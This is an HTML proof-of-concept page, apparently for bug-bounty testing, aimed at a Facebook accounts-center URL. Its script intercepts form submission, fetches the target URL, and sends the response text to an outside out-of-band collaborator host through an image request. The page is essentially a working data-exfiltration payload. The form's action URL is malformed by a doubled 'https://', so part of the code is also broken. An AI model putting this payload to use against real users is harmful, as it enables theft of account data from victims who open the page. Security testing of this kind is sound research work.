<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Redirection Response</title>
</head>
<body>
    <form id="myForm" method="GET" action="https://https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
        <input type="hidden" name="hide_back_button" value="1">
        <input type="hidden" name="from_accounts_center" value="1">
        <input type="submit" value="Send">
    </form>
    <script>
        // Function to capture redirection response
        function captureRedirectionResponse() {
            var form = document.getElementById('myForm');
            var formData = new FormData(form); // Extract form data
            var queryString = new URLSearchParams(formData).toString(); // Convert form data to query string
            var actionUrl = form.getAttribute('action'); // Get form action URL
            var xhr = new XMLHttpRequest();
            xhr.open('GET', actionUrl + '?' + queryString, true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    // Capture the response
                    var response = xhr.responseText;
                    // Send the response to the Burp Suite collaborator
                    var img = new Image();
                    img.src = "http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?response=" + encodeURIComponent(response);
                }
            };
            xhr.send();
        }

        // Function to intercept form submission and capture redirection response
        document.getElementById('myForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the form from being submitted
            captureRedirectionResponse(); // Capture redirection response
            // Perform form submission
            setTimeout(function() {
                document.getElementById('myForm').submit();
            }, 1000); // Adjust the delay as needed
        });
    </script>
</body>
</html>
